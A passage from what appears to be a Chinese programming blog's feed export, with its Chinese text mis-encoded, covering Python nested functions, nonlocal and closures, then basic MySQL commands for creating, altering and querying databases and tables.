å…è®¸å‡½æ•°é€šè¿‡é—­åŒ…çš„å€¼æˆ–å¼•ç”¨çš„å‰¯æœ¬è®¿é—®é‚£äº›æ•è·çš„å˜é‡ï¼Œå³ä½¿å‡½æ•°åœ¨å…¶ä½œç”¨åŸŸä¹‹å¤–è°ƒç”¨ä¹Ÿæ˜¯å¦‚æ­¤ã€‚</p></blockquote><p>åœ¨äº†è§£Pythoné—­åŒ…ä¹‹å‰æˆ‘ä»¬éœ€è¦çŸ¥é“Pythonä¸­çš„<strong>åµŒå¥—å‡½æ•°</strong>å’Œ<strong>éå±€éƒ¨å˜é‡</strong></p><h1 id="åµŒå¥—å‡½æ•°"><a href="#åµŒå¥—å‡½æ•°" class="headerlink" title="åµŒå¥—å‡½æ•°"></a>åµŒå¥—å‡½æ•°</h1><p>åœ¨ä¸€ä¸ªå‡½æ•°å†…å®šä¹‰çš„å¦ä¸€ä¸ªå‡½æ•°,è¿™æ ·çš„å‡½æ•°è¢«ç§°ä¸ºåµŒå¥—å‡½æ•°,<strong>åµŒå¥—å‡½æ•°å¯ä»¥è®¿é—®å°é—­èŒƒå›´çš„å˜é‡,ä½†æ˜¯åœ¨Pytonä¸­å°é—­èŒƒå›´çš„å˜é‡åªæ˜¯Readonly(åªè¯»)çš„,åªèƒ½ä½¿ç”¨nonlocalå…³é”®å­—æ¥ä¿®æ”¹å®ƒä»¬.</strong></p><p>ä¸‹é¢çš„ä¾‹å­ä¸­<strong>innerFunction()</strong>å°±æ˜¯ä¸€ä¸ª<strong>åµŒå¥—å‡½æ•°</strong></p><pre><code>&quot;&quot;&quot;   File Name:åµŒå¥—å‡½æ•°   Dateï¼š2018/12/2   Change Activity:2018/12/2   Description:&quot;&quot;&quot;def outerFunction(msg):    # å¤–éƒ¨å‡½æ•°    msg = msg    def innerFunction():        # å†…éƒ¨å‡½æ•°        print(msg)      # è¿™é‡Œçš„msgä½¿ç”¨çš„æ˜¯å¤–éƒ¨å‡½æ•°ä¸­çš„msgå˜é‡    innerFunction()     # è°ƒç”¨å†…éƒ¨å‡½æ•°if __name__ == &#39;__main__&#39;:    outerFunction(&quot;Python&quot;)</code></pre><h1 id="éå±€éƒ¨å˜é‡"><a href="#éå±€éƒ¨å˜é‡" class="headerlink" title="éå±€éƒ¨å˜é‡"></a>éå±€éƒ¨å˜é‡</h1><p><strong>éå±€éƒ¨å˜é‡</strong>:Python3å¼•å…¥å’Œä¸€ä¸ªæ–°çš„<strong>å…³é”®å­—</strong>nonlocal,è¿™ä¸ªå…³é”®å­—çš„ä½œç”¨æ˜¯å…è®¸ä½¿ç”¨åœ¨å¤–éƒ¨<strong>è€Œä¸æ˜¯å…¨å±€èŒƒå›´å†…çš„å˜é‡</strong>.</p><p>åœ¨ä¸‹é¢è¿™ä¸ªå‡½æ•°ä¸­msgæ˜¯åœ¨å¤–éƒ¨å‡½æ•°ä¸­è¿›è¡Œå£°æ˜å’Œèµ‹å€¼çš„,ä½†æ˜¯åœ¨å†…éƒ¨å‡½æ•°ä¸­æˆ‘ä»¬åˆç»™ä»–è¿›è¡Œäº†èµ‹å€¼,ä½†æ˜¯å½“æˆ‘ä»¬åœ¨å¤–éƒ¨å‡½æ•°ä¸­è°ƒç”¨å†…éƒ¨å‡½æ•°æ—¶,msgçš„å€¼ä¸ºinside,ä½†æ˜¯å½“æˆ‘ä»¬printå¤–éƒ¨å‡½æ•°çš„msgçš„å€¼æ˜¯ä»–çš„å€¼è¿˜æ˜¯æ—§å€¼outside.</p><pre><code>def outside():        msg = &quot;Outside!&quot;        def inside():            msg = &quot;Inside!&quot;            print(msg)        inside()        print(msg)outside()</code></pre><p>OutPut:</p><pre><code>Inside!Outside!</code></pre><p>ä¸ºä»€ä¹ˆä¼šé€ æˆè¿™ç§æƒ…å†µå‘¢?å› ä¸ºPythonå®é™…ä¸Šæ²¡æœ‰åˆ†é…ç»™ç°æœ‰çš„msgå˜é‡,è€Œæ˜¯åœ¨å†…éƒ¨å‡½æ•°ä¸­åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„å˜é‡msg,è¯¥å˜é‡éšè—äº†å¤–éƒ¨ä½œç”¨åŸŸä¸­å˜é‡çš„åç§°.è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨id()æ–¹æ³•æ¥éªŒè¯.</p><pre><code>def outside():        msg = &quot;Outside!&quot;        print(id(msg))        def inside():            msg = &quot;Inside!&quot;            print(msg)            print(id(msg))        inside()        print(msg)outside()</code></pre><p>OutPut:</p><pre><code>1804225423408Inside!1804226238592Outside!</code></pre><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•åœ¨åµŒå¥—å‡½æ•°ä¿®æ”¹å¤–éƒ¨å˜é‡ä¸­çš„å€¼å‘¢?</p><p>ç­”æ¡ˆæ˜¯:nonlocalå…³é”®å­—</p><pre><code>def outside():    msg = &quot;Outside!&quot;    def inside():        nonlocal msg        msg = &quot;Inside!&quot;        print(msg)    inside()    print(msg)outside()</code></pre><p>OutPut:</p><pre><code>Inside!Inside!</code></pre><h1 id="é—­åŒ…"><a href="#é—­åŒ…" class="headerlink" title="é—­åŒ…"></a>é—­åŒ…</h1><p>åœ¨<strong>å‡½æ•°å†…éƒ¨å†å®šä¹‰ä¸€ä¸ªå‡½æ•°</strong>ï¼Œå¹¶ä¸”è¿™<strong>ä¸ªå‡½æ•°ç”¨åˆ°äº†å¤–è¾¹å‡½æ•°çš„å˜é‡</strong>ï¼Œé‚£ä¹ˆå°†<strong>è¿™ä¸ªå‡½æ•°ä»¥åŠç”¨åˆ°çš„ä¸€äº›å˜é‡ç§°ä¹‹ä¸ºé—­åŒ…</strong></p><pre><code>def outerFunction(number):    &#39;&#39;&#39;å¤–éƒ¨å‡½æ•°&#39;&#39;&#39;    def innerFunction(number_in):        &#39;&#39;&#39;åµŒå¥—å‡½æ•°&#39;&#39;&#39;        print(f&#39;å¤–éƒ¨å‡½æ•°ä¸­å‚æ•°numberçš„å€¼:{number}&#39;)        print(f&#39;åµŒå¥—å‡½æ•°ä¸­å‚æ•°number_inçš„å€¼:{number_in}&#39;)        return number + number_in    return innerFunction    # è¿™é‡Œè¿”å›çš„æ˜¯å†…éƒ¨å‡½æ•°çš„å¼•ç”¨,è€Œä¸æ˜¯å†…éƒ¨å‡½æ•°çš„å€¼,å¸¦æ‹¬å·ä»£è¡¨å¼•ç”¨,ä¸å¸¦æ‹¬å·è¡¨ç¤ºæ‰§è¡Œif __name__ == &#39;__main__&#39;:    inner = outerFunction(100)      # ç»™å¤–éƒ¨å‡½æ•°èµ‹å€¼,è¿™é‡Œå¤–éƒ¨å‡½æ•°è¿”å›çš„æ˜¯åµŒå¥—å‡½æ•°çš„å¼•ç”¨(innerFunction)    print(inner)    inner(200)      # è¿™é‡Œæ‰æ˜¯è°ƒç”¨çš„åµŒå¥—å‡½æ•°    print(inner(200))       # printå‡ºåµŒå¥—å‡½æ•°çš„è¿”å›å€¼ number+number_in</code></pre><p>OutPut:</p><pre><code>&lt;function outerFunction.&lt;locals&gt;.innerFunction at 0x0000017C8B987620&gt;å¤–éƒ¨å‡½æ•°ä¸­å‚æ•°numberçš„å€¼:100åµŒå¥—å‡½æ•°ä¸­å‚æ•°number_inçš„å€¼:200å¤–éƒ¨å‡½æ•°ä¸­å‚æ•°numberçš„å€¼:100åµŒå¥—å‡½æ•°ä¸­å‚æ•°number_inçš„å€¼:200300</code></pre><p>åœ¨ä¸Šé¢çš„ä»£ç ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡º,é€šè¿‡ä½¿ç”¨é—­åŒ…,æˆ‘ä»¬<strong>å¯ä»¥è°ƒç”¨å…¶èŒƒå›´ä¹‹å¤–çš„å‡½æ•°.</strong></p><p><strong>æ³¨æ„</strong>:<br>ç”±äº<strong>é—­åŒ…å¼•ç”¨äº†å¤–éƒ¨å‡½æ•°çš„å±€éƒ¨å˜é‡</strong>ï¼Œåˆ™<strong>å¤–éƒ¨å‡½æ•°çš„å±€éƒ¨å˜é‡æ²¡æœ‰åŠæ—¶é‡Šæ”¾ï¼Œæ¶ˆè€—å†…å­˜</strong></p><p><strong>ä»€ä¹ˆæ—¶å€™ä½¿ç”¨é—­åŒ…</strong><br><strong>é—­åŒ…å¯ä»¥é¿å…ä½¿ç”¨å…¨å±€å˜é‡å¹¶æä¾›æŸç§å½¢å¼çš„æ•°æ®éšè—</strong>ã€‚ï¼ˆä¾‹å¦‚ï¼Œå½“ç±»ä¸­çš„æ–¹æ³•å¾ˆå°‘æ—¶ï¼Œä½¿ç”¨é—­åŒ…ï¼‰ã€‚</p><p>Pythonä¸­çš„<strong>è£…é¥°å™¨</strong>å¹¿æ³›ä½¿ç”¨é—­åŒ…ã€‚</p><h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><p>åˆ›å»ºä¸€ä¸ªpythoné—­åŒ…ï¼Œä½¿å‡½æ•°å¯ä»¥ä½¿ç”¨é—­åŒ…è·å¾—å¤šä¸ªä¹˜æ³•å‡½æ•°ã€‚</p><pre><code>def multiplier_of(n):    def multiplier(number):        return number * n    return multipliermultiplier = multiplier_of(5)  # return multiplierresult = multiplier(10)  # multiplier(10)print(result)  # return number * n</code></pre><p>OutPut:</p><pre><code>50</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>MysqlåŸºç¡€</title>
      <link href="/2018/11/20/mysql-ji-chu/"/>
      <url>/2018/11/20/mysql-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL-ç®€ä»‹"><a href="#MySQL-ç®€ä»‹" class="headerlink" title="MySQL ç®€ä»‹"></a>MySQL ç®€ä»‹</h1><p>MySQLæ˜¯ä¸€ä¸ªå…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œç”±ç‘å…¸MySQL ABå…¬å¸å¼€å‘ï¼Œåæ¥è¢«Sunå…¬å¸æ”¶è´­ï¼ŒSunå…¬å¸åæ¥åˆè¢«Oracleå…¬å¸æ”¶è´­ï¼Œç›®å‰å±äºOracleæ——ä¸‹äº§å“</p><h2 id="ç‰¹ç‚¹"><a href="#ç‰¹ç‚¹" class="headerlink" title="ç‰¹ç‚¹"></a>ç‰¹ç‚¹</h2><ul><li><p>ä½¿ç”¨Cå’ŒC++ç¼–å†™ï¼Œå¹¶ä½¿ç”¨äº†å¤šç§ç¼–è¯‘å™¨è¿›è¡Œæµ‹è¯•ï¼Œä¿è¯æºä»£ç çš„å¯ç§»æ¤æ€§</p></li><li><p>æ”¯æŒå¤šç§æ“ä½œç³»ç»Ÿï¼Œå¦‚Linuxã€Windowsã€AIXã€FreeBSDã€HP-UXã€MacOSã€NovellNetwareã€OpenBSDã€OS/2 Wrapã€Solarisç­‰</p></li><li><p>ä¸ºå¤šç§ç¼–ç¨‹è¯­è¨€æä¾›äº†APIï¼Œå¦‚Cã€C++ã€Pythonã€Javaã€Perlã€PHPã€Eiffelã€Rubyç­‰</p></li><li><p>æ”¯æŒå¤šçº¿ç¨‹ï¼Œå……åˆ†åˆ©ç”¨CPUèµ„æº</p></li><li>ä¼˜åŒ–çš„SQLæŸ¥è¯¢ç®—æ³•ï¼Œæœ‰æ•ˆåœ°æé«˜æŸ¥è¯¢é€Ÿåº¦</li><li>æä¾›å¤šè¯­è¨€æ”¯æŒï¼Œå¸¸è§çš„ç¼–ç å¦‚GB2312ã€BIG5ã€UTF8</li><li>æä¾›TCP/IPã€ODBCå’ŒJDBCç­‰å¤šç§æ•°æ®åº“è¿æ¥é€”å¾„</li><li>æä¾›ç”¨äºç®¡ç†ã€æ£€æŸ¥ã€ä¼˜åŒ–æ•°æ®åº“æ“ä½œçš„ç®¡ç†å·¥å…·</li><li>å¤§å‹çš„æ•°æ®åº“ã€‚å¯ä»¥å¤„ç†æ‹¥æœ‰ä¸Šåƒä¸‡æ¡è®°å½•çš„å¤§å‹æ•°æ®åº“</li><li>æ”¯æŒå¤šç§å­˜å‚¨å¼•æ“</li><li>MySQL è½¯ä»¶é‡‡ç”¨äº†åŒæˆæƒæ”¿ç­–ï¼Œå®ƒåˆ†ä¸ºç¤¾åŒºç‰ˆå’Œå•†ä¸šç‰ˆï¼Œç”±äºå…¶ä½“ç§¯å°ã€é€Ÿåº¦å¿«ã€æ€»ä½“æ‹¥æœ‰æˆæœ¬ä½ï¼Œå°¤å…¶æ˜¯å¼€æ”¾- æºç è¿™ä¸€ç‰¹ç‚¹ï¼Œä¸€èˆ¬ä¸­å°å‹ç½‘ç«™çš„å¼€å‘éƒ½é€‰æ‹©MySQLä½œä¸ºç½‘ç«™æ•°æ®åº“</li><li>MySQLä½¿ç”¨æ ‡å‡†çš„SQLæ•°æ®è¯­è¨€å½¢å¼</li><li>Mysqlæ˜¯å¯ä»¥å®šåˆ¶çš„ï¼Œé‡‡ç”¨äº†GPLåè®®ï¼Œä½ å¯ä»¥ä¿®æ”¹æºç æ¥å¼€å‘è‡ªå·±çš„Mysqlç³»ç»Ÿ</li><li>åœ¨çº¿DDLæ›´æ”¹åŠŸèƒ½</li><li>å¤åˆ¶å…¨å±€äº‹åŠ¡æ ‡è¯†</li><li>å¤åˆ¶æ— å´©æºƒä»æœº</li><li>å¤åˆ¶å¤šçº¿ç¨‹ä»æœº</li></ul><h1 id="åŸºæœ¬å‘½ä»¤"><a href="#åŸºæœ¬å‘½ä»¤" class="headerlink" title="åŸºæœ¬å‘½ä»¤"></a>åŸºæœ¬å‘½ä»¤</h1><p>é“¾æ¥Mysqlæ•°æ®åº“</p><p>mysql -u root -p</p><p>é€€å‡ºæ•°æ®åº“</p><p>exit,quit,Ctrl+d</p><p>æ˜¾ç¤ºæ—¶é—´</p><p>select time();</p><p>æ˜¾ç¤ºMysqlç‰ˆæœ¬</p><p>select version();</p><p><strong>æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“</strong></p><p>show databases;</p><p><strong>åˆ›å»ºæ•°æ®åº“(8.0.13é»˜è®¤çš„å­—ç¬¦ç¼–ç ä¸ºutf8mb4)</strong></p><p>create database æ•°æ®åº“å charset=utf8;</p><p>create database python;</p><p><strong>åˆ›å»ºæ•°æ®åº“å¹¶æŒ‡å®šç¼–ç </strong></p><p>create database Python charset=utf8;</p><p><strong>åˆ é™¤æ•°æ®åº“</strong></p><p>drop database æ•°æ®åº“å;</p><p>drop database Python;</p><p><strong>æŸ¥çœ‹åˆ›å»ºæ•°æ®åº“çš„è¯­å¥</strong></p><p>show create database Python;</p><p><strong>æ•°æ®åº“åå­—æ³¨æ„äº‹é¡¹</strong></p><p>å½“æ•°æ®åº“åå­—ä¸­æœ‰ç‰¹æ®Šå­—ç¬¦æ—¶,<strong>æ•°æ®åº“åå­—ä½¿ç”¨<code></code>(æ³¢æµªå·,Tableé”®ä¸Šé¢çš„é”®)</strong></p><pre><code>mysql&gt; create database Python-1    -&gt; ;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;-1&#39; at line 1mysql&gt; create database `Python-1`;Query OK, 1 row affected (0.06 sec)mysql&gt; drop database `Python-1`    -&gt; ;Query OK, 0 rows affected (0.02 sec)</code></pre><p><strong>æŸ¥çœ‹å½“å‰ä½¿ç”¨çš„æ•°æ®åº“</strong></p><p>select database();</p><pre><code>mysql&gt; select database;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; at line 1mysql&gt; select database();+------------+| database() |+------------+| NULL       |+------------+1 row in set (0.00 sec)</code></pre><p><strong>ä½¿ç”¨æ•°æ®åº“</strong></p><p>use æ•°æ®åº“å;</p><p>use Python</p><pre><code>mysql&gt; use Python;Database changedmysql&gt; select database();+------------+| database() |+------------+| Python     |+------------+1 row in set (0.00 sec)</code></pre><h1 id="æ•°æ®è¡¨çš„æ“ä½œ"><a href="#æ•°æ®è¡¨çš„æ“ä½œ" class="headerlink" title="æ•°æ®è¡¨çš„æ“ä½œ"></a>æ•°æ®è¡¨çš„æ“ä½œ</h1><p><strong>æŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨</strong></p><p>show tables;</p><p><strong>åœ¨å½“å‰æ•°æ®åº“ä¸­åˆ›å»ºè¡¨</strong></p><p>create table Class(id int,name varchar(2));</p><pre><code>mysql&gt; create table Class(id int,name varchar(20));Query OK, 0 rows affected (0.13 sec)mysql&gt; show tables;+------------------+| Tables_in_Python |+------------------+| Class            |+------------------+1 row in set (0.00 sec)</code></pre><p><strong>åˆ›å»ºè¡¨çš„åŒæ—¶æ·»åŠ çº¦æŸ</strong></p><p>create table student(id int primary key not null auto_increment,name varchar(20));<br>Query OK, 0 rows affected (0.14 sec)</p><pre><code>mysql&gt; desc student;+-------+-------------+------+-----+---------+----------------+| Field | Type        | Null | Key | Default | Extra          |+-------+-------------+------+-----+---------+----------------+| id    | int(11)     | NO   | PRI | NULL    | auto_increment || name  | varchar(20) | YES  |     | NULL    |                |+-------+-------------+------+-----+---------+----------------+2 rows in set (0.00 sec)</code></pre><p><strong>Mysqlå‘½ä»¤è¡Œæ”¯æŒæ¢è¡Œ,ä½¿ç”¨æ¢è¡Œåˆ›å»ºè¡¨</strong></p><p>ä½¿ç”¨æ¢è¡Œåˆ›å»ºè¡¨å¹¶æ·»åŠ çº¦æŸä¼šæ¯”ä¸æ¢è¡Œå¯è¯»æ€§è¦å¥½</p><pre><code>mysql&gt; create table teacher(    -&gt; id int primary key not null auto_increment,    -&gt; name varchar(20),    -&gt; age int not null);Query OK, 0 rows affected (0.10 sec)mysql&gt; desc teacher;+-------+-------------+------+-----+---------+----------------+| Field | Type        | Null | Key | Default | Extra          |+-------+-------------+------+-----+---------+----------------+| id    | int(11)     | NO   | PRI | NULL    | auto_increment || name  | varchar(20) | YES  |     | NULL    |                || age   | int(11)     | NO   |     | NULL    |                |+-------+-------------+------+-----+---------+----------------+3 rows in set (0.00 sec)</code></pre><p><strong>æŸ¥çœ‹æ•°æ®è¡¨çš„ç»“æ„</strong></p><p>desc è¡¨å;</p><p>desc Class</p><pre><code>mysql&gt; desc Class;+-------+-------------+------+-----+---------+-------+| Field | Type        | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| id    | int(11)     | YES  |     | NULL    |       || name  | varchar(20) | YES  |     | NULL    |       |+-------+-------------+------+-----+---------+-------+2 rows in set (0.00 sec)</code></pre><h1 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h1><p>åˆ›å»ºstudentsè¡¨(idã€nameã€ageã€highã€genderã€cls_id)</p><p>create table students( id int unsigned not null auto_increment primary key, name varchar(30), age tinyint unsigned default 0, high decimal(5,2), gender enum(â€œç”·â€,â€å¥³â€,â€ä¸­æ€§â€,â€ä¿å¯†â€) default â€œä¿å¯†â€, cls_id int unsigned );</p><pre><code>mysql&gt; create table students(    -&gt; id int unsigned not null auto_increment primary key,    -&gt; name varchar(30),    -&gt; age tinyint unsigned default 0,    -&gt; high decimal(5,2),    -&gt; gender enum(&quot;ç”·&quot;,&quot;å¥³&quot;,&quot;ä¸­æ€§&quot;,&quot;ä¿å¯†&quot;) default &quot;ä¿å¯†&quot;,    -&gt; cls_id int unsigned    -&gt; );Query OK, 0 rows affected (0.35 sec)mysql&gt; desc students;+--------+-------------------------------------+------+-----+---------+----------------+| Field  | Type                                | Null | Key | Default | Extra          |+--------+-------------------------------------+------+-----+---------+----------------+| id     | int(10) unsigned                    | NO   | PRI | NULL    | auto_increment || name   | varchar(30)                         | YES  |     | NULL    |                || age    | tinyint(3) unsigned                 | YES  |     | 0       |                || high   | decimal(5,2)                        | YES  |     | NULL    |                || gender | enum(&#39;ç”·&#39;,&#39;å¥³&#39;,&#39;ä¸­æ€§&#39;,&#39;ä¿å¯†&#39;)        | YES  |     | ä¿å¯†     |                || cls_id | int(10) unsigned                    | YES  |     | NULL    |                |+--------+-------------------------------------+------+-----+---------+----------------+6 rows in set (0.01 sec)</code></pre><p>åˆ›å»ºClassè¡¨(id,name)</p><pre><code>mysql&gt; create table class(    -&gt; id int unsigned not null auto_increment primary key,    -&gt; name varchar(20)    -&gt; );Query OK, 0 rows affected (0.34 sec)mysql&gt; desc class;+-------+------------------+------+-----+---------+----------------+| Field | Type             | Null | Key | Default | Extra          |+-------+------------------+------+-----+---------+----------------+| id    | int(10) unsigned | NO   | PRI | NULL    | auto_increment || name  | varchar(20)      | YES  |     | NULL    |                |+-------+------------------+------+-----+---------+----------------+2 rows in set (0.00 sec)</code></pre><p><strong>æ’å…¥æ•°æ®</strong></p><p>insert into class values(0,â€Pythoné«˜çº§å¼€å‘ç­â€);</p><pre><code>mysql&gt; insert into class values(0,&quot;Pythoné«˜çº§å¼€å‘ç­&quot;);Query OK, 1 row affected (0.28 sec)</code></pre><p>insert into students values(0,â€æ›¹æ“â€,18,179.5,â€å¥³â€,0);</p><pre><code>mysql&gt; select * from students;Empty set (0.00 sec)mysql&gt; insert into students values(0,&quot;æ›¹æ“&quot;,18,175.5,&quot;å¥³&quot;,0);Query OK, 1 row affected (0.09 sec)</code></pre><p><strong>æŸ¥è¯¢æ•°æ®</strong></p><p>select * from class;</p><pre><code>mysql&gt; select * from class;+----+-----------------------+| id | name                  |+----+-----------------------+|  1 | Pythoné«˜çº§å¼€å‘ç­      |+----+-----------------------+1 row in set (0.00 sec)</code></pre><p>select * from students;</p><pre><code>mysql&gt; select * from students;+----+--------+------+--------+--------+--------+| id | name   | age  | high   | gender | cls_id |+----+--------+------+--------+--------+--------+|  1 | æ›¹æ“   |   18 | 175.50 | å¥³     |      0 |+----+--------+------+--------+--------+--------+1 row in set (0.00 sec)</code></pre><p>ä¿®æ”¹è¡¨â€“æ·»åŠ å­—æ®µ</p><p>alter table è¡¨å add åˆ—å ç±»å‹;</p><p>alter table students <strong>add</strong> birthday datetime;</p><pre><code>mysql&gt; alter table students add birthday datetime;Query OK, 0 rows affected (0.15 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; desc students;+----------+-------------------------------------+------+-----+---------+----------------+| Field    | Type                                | Null | Key | Default | Extra          |+----------+-------------------------------------+------+-----+---------+----------------+| id       | int(10) unsigned                    | NO   | PRI | NULL    | auto_increment || name     | varchar(30)                         | YES  |     | NULL    |                || age      | tinyint(3) unsigned                 | YES  |     | 0       |                || high     | decimal(5,2)                        | YES  |     | NULL    |                || gender   | enum(&#39;ç”·&#39;,&#39;å¥³&#39;,&#39;ä¸­æ€§&#39;,&#39;ä¿å¯†&#39;)       | YES  |     | ä¿å¯†    |                || cls_id   | int(10) unsigned                    | YES  |     | NULL    |                || birthday | datetime                            | YES  |     | NULL    |                |+----------+-------------------------------------+------+-----+---------+----------------+7 rows in set (0.00 sec)</code></pre><p>ä¿®æ”¹è¡¨â€“ä¿®æ”¹å­—æ®µ,ä¸é‡å‘½åå­—æ®µå</p><p>alter table è¡¨å <strong>modify</strong> åˆ—å ç±»å‹åŠçº¦æŸ;</p><p>alter table students <strong>modify</strong> birthday date;</p><pre><code>mysql&gt; alter table students modify birthday date;Query OK, 1 row affected (0.19 sec)Records: 1  Duplicates: 0  Warnings: 0mysql&gt; desc students;+----------+-------------------------------------+------+-----+---------+----------------+| Field    | Type                                | Null | Key | Default | Extra          |+----------+-------------------------------------+------+-----+---------+----------------+| id       | int(10) unsigned                    | NO   | PRI | NULL    | auto_increment || name     | varchar(30)                         | YES  |     | NULL    |                || age      | tinyint(3) unsigned                 | YES  |     | 0       |                || high     | decimal(5,2)                        | YES  |     | NULL    |                || gender   | enum(&#39;ç”·&#39;,&#39;å¥³&#39;,&#39;ä¸­æ€§&#39;,&#39;ä¿å¯†&#39;)       | YES  |     | ä¿å¯†    |                || cls_id   | int(10) unsigned                    | YES  |     | NULL    |                || birthday | date                                | YES  |     | NULL    |                |+----------+-------------------------------------+------+-----+---------+----------------+7 rows in set (0.00 sec)</code></pre><p>ä¿®æ”¹è¡¨â€“ä¿®æ”¹å­—æ®µ,é‡å‘½åå­—æ®µå,å¹¶ç»™å­—æ®µæ·»åŠ é»˜è®¤å€¼</p><p>alter table è¡¨å <strong>change</strong> åŸå æ–°å ç±»å‹åŠçº¦æŸ;</p><p>alter table students <strong>change</strong> birthday birth date default â€œ1990-01-01â€;</p><pre><code>mysql&gt; alter table students change birthday birth date default &quot;1990-01-01&quot;;Query OK, 0 rows affected (0.09 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; desc students;+--------+-------------------------------------+------+-----+------------+----------------+| Field  | Type                                | Null | Key | Default    | Extra          |+--------+-------------------------------------+------+-----+------------+----------------+| id     | int(10) unsigned                    | NO   | PRI | NULL       | auto_increment || name   | varchar(30)                         | YES  |     | NULL       |                || age    | tinyint(3) unsigned                 | YES  |     | 0          |                || high   | decimal(5,2)                        | YES  |     | NULL       |                || gender | enum(&#39;ç”·&#39;,&#39;å¥³&#39;,&#39;ä¸­æ€§&#39;,&#39;ä¿å¯†&#39;)       | YES  |     | ä¿å¯†       |                || cls_id | int(10) unsigned                    | YES  |     | NULL       |                || birth  | date                                | YES  |     | 1990-01-01 |                |+--------+-------------------------------------+------+-----+------------+----------------+7 rows in set (0.01 sec)</code></pre><p>ä¿®æ”¹è¡¨â€“åˆ é™¤å­—æ®µ</p><p>alter table è¡¨å <strong>drop</strong> åˆ—å;</p><p>alter table students drop high;</p><pre><code>mysql&gt; alter table students drop high;Query OK, 0 rows affected (0.24 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; desc students;+--------+-------------------------------------+------+-----+------------+----------------+| Field  | Type                                | Null | Key | Default    | Extra          |+--------+-------------------------------------+------+-----+------------+----------------+| id     | int(10) unsigned                    | NO   | PRI | NULL       | auto_increment || name   | varchar(30)                         | YES  |     | NULL       |                || age    | tinyint(3) unsigned                 | YES  |     | 0          |                || gender | enum(&#39;ç”·&#39;,&#39;å¥³&#39;,&#39;ä¸­æ€§&#39;,&#39;ä¿å¯†&#39;)       | YES  |     | ä¿å¯†       |                || cls_id | int(10) unsigned                    | YES  |     | NULL       |                || birth  | date                                | YES  |     | 1990-01-01 |                |+--------+-------------------------------------+------+-----+------------+----------------+6 rows in set (0.00 sec)</code></pre><p>åˆ é™¤è¡¨</p><p>drop table è¡¨å;</p><p>drop table students;</p><pre><code>mysql&gt; show tables;+------------------+| Tables_in_School |+------------------+| class            || students         || xxxx             |+------------------+3 rows in set (0.00 sec)mysql&gt; drop table xxxx;Query OK, 0 rows affected (0.09 sec)mysql&gt; show tables;+------------------+| Tables_in_School |+------------------+| class            || students         |+------------------+2 rows in set (0.00 sec)</code></pre><p><strong>æŸ¥çœ‹è¡¨çš„åˆ›å»ºè¯­å¥</strong></p><p>show create table è¡¨å;</p><p>è¿™é‡Œå¯ä»¥æŸ¥çœ‹æ•°æ®åº“ä½¿ç”¨çš„å¼•æ“,è¿™é‡Œæœ¬äººä½¿ç”¨çš„æ˜¯<strong>InnDBå¼•æ“</strong>.</p><p><strong>Mysqlå¼•æ“è¯¦æƒ…è‡ªè¡ŒGoogld:MySQLå‡ ç§å¸¸ç”¨çš„å­˜å‚¨å¼•æ“åŒºåˆ«</strong></p><pre><code>mysql&gt; show create table students;+----------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table    | Create Table                                                                                |+----------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| students | CREATE TABLE `students` (  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,  `name` varchar(30) DEFAULT NULL,  `age` tinyint(3) unsigned DEFAULT &#39;0&#39;,  `gender` enum(&#39;ç”·&#39;,&#39;å¥³&#39;,&#39;ä¸­æ€§&#39;,&#39;ä¿å¯†&#39;) DEFAULT &#39;ä¿å¯†&#39;,  `cls_id` int(10) unsigned DEFAULT NULL,  `birth` date DEFAULT &#39;1990-01-01&#39;,  PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci         |+----------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)</code></pre><h1 id="æ•°æ®è¡¨çš„å¢åˆ æ”¹æŸ¥-CRUD"><a href="#æ•°æ®è¡¨çš„å¢åˆ æ”¹æŸ¥-CRUD" class="headerlink" title="æ•°æ®è¡¨çš„å¢åˆ æ”¹æŸ¥(CRUD)"></a>æ•°æ®è¡¨çš„å¢åˆ æ”¹æŸ¥(CRUD)</h1><h2 id="å¢åŠ "><a href="#å¢åŠ " class="headerlink" title="å¢åŠ "></a>å¢åŠ </h2><p><strong>å…¨åˆ—æ’å…¥</strong></p><p>insert into è¡¨å values(â€¦);</p><p>å‘ç­çº§è¡¨ä¸­æ’å…¥ä¸€ä¸ªç­çº§</p><p>insert into class values(2,â€Pythonå…¥é—¨ç­â€);</p><pre><code>mysql&gt; show tables;+------------------+| Tables_in_School |+------------------+| class            || students         |+------------------+2 rows in set (0.00 sec)mysql&gt; select * from class;+----+-----------------------+| id | name                  |+----+-----------------------+|  1 | Pythoné«˜çº§å¼€å‘ç­      |+----+-----------------------+1 row in set (0.00 sec)mysql&gt; insert into class values(2,&quot;Pythonå…¥é—¨ç­&quot;);Query OK, 1 row affected (0.13 sec)mysql&gt; select * from class;+----+-----------------------+| id | name                  |+----+-----------------------+|  1 | Pythoné«˜çº§å¼€å‘ç­      ||  2 